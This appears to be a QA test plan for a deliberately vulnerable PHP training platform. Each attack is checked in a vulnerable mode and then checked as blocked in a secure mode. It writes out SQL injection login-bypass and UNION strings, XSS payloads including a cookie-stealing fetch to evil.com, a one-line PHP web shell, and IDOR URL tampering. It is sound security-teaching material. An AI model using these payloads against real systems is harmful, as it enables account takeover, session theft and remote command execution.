# MyEduConnect - Testing Documentation

This document provides comprehensive testing procedures for the MyEduConnect cybersecurity training platform.

## 🧪 Testing Overview

MyEduConnect requires testing in two distinct modes:
1. **Vulnerable Mode** - Verify all attacks work as expected
2. **Secure Mode** - Verify all attacks are properly blocked

## 📋 Pre-Testing Checklist

### Environment Setup
- [ ] Docker containers running: `docker-compose ps`
- [ ] Database initialized: Check phpMyAdmin at http://localhost:8081
- [ ] Application accessible: http://localhost:8080
- [ ] Uploads directory writable: `chmod 755 app/uploads`
- [ ] .env file configured with correct settings

### Initial Configuration
- [ ] Login as admin: admin@myeduconnect.com / password
- [ ] Navigate to Security Settings
- [ ] Set Global Mode to "Vulnerable"
- [ ] Enable all individual vulnerability toggles
- [ ] Save settings

## 💥 Vulnerability Testing

### 1. SQL Injection (SQLi) Testing

#### Vulnerable Mode Tests

**Test 1.1: Login Bypass via SQLi**
```
Steps:
1. Navigate to http://localhost:8080/login.php
2. In Email field, enter: admin@myeduconnect.com' OR '1'='1'--
3. In Password field, enter: anything
4. Click Sign In

Expected Result:
- Login successful
- Redirected to admin dashboard
- Session established with admin privileges

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test 1.2: Data Extraction via UNION-based SQLi**
```
Steps:
1. Navigate to course search
2. In search field, enter: ' UNION SELECT 1,2,3,4,5,6,7,8,9--
3. Click Search

Expected Result:
- Additional data from other tables displayed
- Database structure exposed

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

#### Secure Mode Tests

**Test 1.3: SQLi Blocked in Secure Mode**
```
Steps:
1. Go to Admin > Security Settings
2. Set SQLi Protection: ON
3. Save settings
4. Attempt login bypass with: ' OR '1'='1'--
5. Click Sign In

Expected Result:
- Login fails
- Error message: "Invalid email or password"
- No session established

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test 1.4: Prepared Statements Working**
```
Steps:
1. With SQLi Protection ON
2. Login with valid credentials: admin@myeduconnect.com / password
3. Verify login successful

Expected Result:
- Login successful only with valid credentials
- Prepared statements used (check logs/code)

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

---

### 2. Stored XSS Testing

#### Vulnerable Mode Tests

**Test 2.1: Script Injection in Profile Bio**
```
Steps:
1. Login as student: student1@myeduconnect.com / password
2. Navigate to Profile
3. In "About Me" field, enter: <script>alert('XSS')</script>
4. Update Profile
5. View Profile page

Expected Result:
- JavaScript alert executes
- "XSS" popup appears
- Script stored in database

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test 2.2: Cookie Theft via XSS**
```
Steps:
1. In Profile Bio, enter: <script>fetch('http://evil.com?c='+document.cookie)</script>
2. Update Profile
3. View Profile
4. Check browser network tab for external request

Expected Result:
- External request made to evil.com
- Cookie data sent in request

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

#### Secure Mode Tests

**Test 2.3: XSS Escaped in Secure Mode**
```
Steps:
1. Go to Admin > Security Settings
2. Set XSS Protection: ON
3. Save settings
4. Login as student
5. In Profile Bio, enter: <script>alert('XSS')</script>
6. Update Profile
7. View Profile

Expected Result:
- Script displayed as text, not executed
- No alert popup
- HTML entities escaped: &lt;script&gt;alert('XSS')&lt;/script&gt;

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

---

### 3. IDOR (Insecure Direct Object Reference) Testing

#### Vulnerable Mode Tests

**Test 3.1: Access Another User's Profile**
```
Steps:
1. Login as student1 (user_id=4)
2. Note your own user_id from URL or session
3. Change URL to: /student/profile.php?user_id=5 (student2)
4. Access page

Expected Result:
- Student2's profile data displayed
- Personal information visible
- No access denied message

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test 3.2: Access Admin User Data**
```
Steps:
1. Login as student
2. Change URL to: /student/profile.php?user_id=1 (admin)
3. Access page

Expected Result:
- Admin profile data accessible
- Sensitive information exposed

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

#### Secure Mode Tests

**Test 3.3: IDOR Blocked in Secure Mode**
```
Steps:
1. Go to Admin > Security Settings
2. Set IDOR Protection: ON
3. Save settings
4. Login as student1
5. Try to access: /student/profile.php?user_id=5

Expected Result:
- Access denied
- Redirect to own profile or error page
- "Access denied" or similar message

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test 3.4: Admin Can Still Access All Profiles**
```
Steps:
1. With IDOR Protection ON
2. Login as admin
3. Access any user profile via user_id parameter

Expected Result:
- Admin can access all profiles
- Role-based access control working

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

---

### 4. File Upload Vulnerability Testing

#### Vulnerable Mode Tests

**Test 4.1: Upload PHP Web Shell**
```
Steps:
1. Login as teacher: teacher1@myeduconnect.com / password
2. Navigate to Course Materials
3. Create file: shell.php with content: <?php system($_GET['cmd']); ?>
4. Upload as course material
5. Note the file path from success message
6. Access uploaded file: http://localhost:8080/app/uploads/shell.php?cmd=ls

Expected Result:
- File upload successful
- PHP file executes
- Command output displayed (directory listing)

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test 4.2: Upload Executable File**
```
Steps:
1. Create .exe file with malicious content
2. Upload as course material
3. Check if upload succeeds

Expected Result:
- Upload succeeds
- File stored with original extension
- File accessible via direct URL

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

#### Secure Mode Tests

**Test 4.3: PHP File Upload Blocked**
```
Steps:
1. Go to Admin > Security Settings
2. Set Upload Protection: ON
3. Save settings
4. Login as teacher
5. Try to upload shell.php

Expected Result:
- Upload rejected
- Error message: "Invalid file type"
- File not stored

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test 4.4: MIME Type Validation**
```
Steps:
1. With Upload Protection ON
2. Rename shell.php to shell.pdf
3. Try to upload

Expected Result:
- Upload rejected
- MIME type validation catches the deception
- Error message about invalid MIME type

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test 4.5: Allowed Files Still Work**
```
Steps:
1. With Upload Protection ON
2. Upload valid PDF file
3. Verify upload succeeds

Expected Result:
- Valid file types (PDF, DOC, etc.) upload successfully
- File accessible for download

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

---

### 5. Weak Authentication Testing

#### Vulnerable Mode Tests

**Test 5.1: Password Bypass with SQLi**
```
Steps:
1. Set SQLi Protection: OFF
2. Set Weak Auth Protection: OFF
3. Attempt login with: ' OR '1'='1'-- / anypassword

Expected Result:
- Login successful without password verification
- Session established

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

#### Secure Mode Tests

**Test 5.2: Password Verification Enforced**
```
Steps:
1. Set Weak Auth Protection: ON
2. Try login with wrong password
3. Try login with correct password

Expected Result:
- Wrong password: Login fails
- Correct password: Login succeeds
- Bcrypt verification working

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

---

### 6. CSRF Testing

#### Vulnerable Mode Tests

**Test 6.1: CSRF Token Missing**
```
Steps:
1. Inspect form HTML in vulnerable mode
2. Check for csrf_token field

Expected Result:
- No CSRF token present
- Forms vulnerable to CSRF

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

#### Secure Mode Tests

**Test 6.2: CSRF Token Present and Validated**
```
Steps:
1. Set CSRF Protection: ON
2. Inspect form HTML
3. Submit form with invalid/missing token

Expected Result:
- CSRF token present in forms
- Invalid token rejected
- Request blocked

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

---

## 🎛️ Toggle System Testing

### Global Mode Testing

**Test G.1: Global Vulnerable Mode**
```
Steps:
1. Set Global Mode: Vulnerable
2. Disable all individual toggles
3. Test SQLi attack

Expected Result:
- SQLi attack works (global mode overrides individual toggles)
- All vulnerabilities enabled

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

**Test G.2: Global Secure Mode**
```
Steps:
1. Set Global Mode: Secure
2. Enable all individual toggles
3. Test SQLi attack

Expected Result:
- SQLi attack blocked (global mode overrides individual toggles)
- All vulnerabilities disabled

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

### Individual Toggle Testing

**Test I.1: Individual Toggle Independence**
```
Steps:
1. Set Global Mode: Vulnerable
2. Disable SQLi Protection only
3. Enable all other protections
4. Test each vulnerability

Expected Result:
- SQLi works (disabled)
- XSS blocked (enabled)
- IDOR blocked (enabled)
- Upload blocked (enabled)
- Auth enforced (enabled)

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

### .env File Sync Testing

**Test E.1: Admin Panel Updates .env**
```
Steps:
1. Check .env file current values
2. Change toggles in Admin Panel
3. Save settings
4. Check .env file again

Expected Result:
- .env file updated with new values
- Database and .env in sync

Actual Result: _____________
Status: [ ] PASS [ ] FAIL
```

---

## 📊 Test Results Summary

### Vulnerable Mode Results
- SQL Injection: [ ] PASS [ ] FAIL
- XSS: [ ] PASS [ ] FAIL
- IDOR: [ ] PASS [ ] FAIL
- File Upload: [ ] PASS [ ] FAIL
- Weak Auth: [ ] PASS [ ] FAIL
- CSRF: [ ] PASS [ ] FAIL

### Secure Mode Results
- SQL Injection: [ ] PASS [ ] FAIL
- XSS: [ ] PASS [ ] FAIL
- IDOR: [ ] PASS [ ] FAIL
- File Upload: [ ] PASS [ ] FAIL
- Weak Auth: [ ] PASS [ ] FAIL
- CSRF: [ ] PASS [ ] FAIL

### Toggle System Results
- Global Mode: [ ] PASS [ ] FAIL
- Individual Toggles: [ ] PASS [ ] FAIL
- .env Sync: [ ] PASS [ ] FAIL

---

## 🔍 Regression Testing

After any code changes, re-run:

1. All vulnerable mode tests
2. All secure mode tests
3. Toggle system tests
4. Core LMS functionality (login, courses, profiles)

---

## 📝 Bug Reporting Template

```
Bug Report - MyEduConnect

Description:
[Detailed description of the issue]

Steps to Reproduce:
1. 
2. 
3. 

Expected Behavior:
[What should happen]

Actual Behavior:
[What actually happened]

Environment:
- Security Mode: Vulnerable/Secure
- Individual Toggles: [list current settings]
- Browser: [browser and version]
- Docker: [version if applicable]

Screenshots:
[Attach if applicable]
```

---

## ✅ Final Verification Checklist

Before marking testing complete:

- [ ] All vulnerable mode tests pass
- [ ] All secure mode tests pass
- [ ] Toggle system works correctly
- [ ] .env file syncs with admin panel
- [ ] Core LMS features functional
- [ ] No console errors in browser
- [ ] No PHP errors in logs
- [ ] Docker containers stable
- [ ] Documentation updated
- [ ] README.md accurate

---

**Testing Completed By:** _____________  
**Date:** _____________  
**Environment:** Docker / Manual  
**Overall Status:** [ ] PASS [ ] FAIL
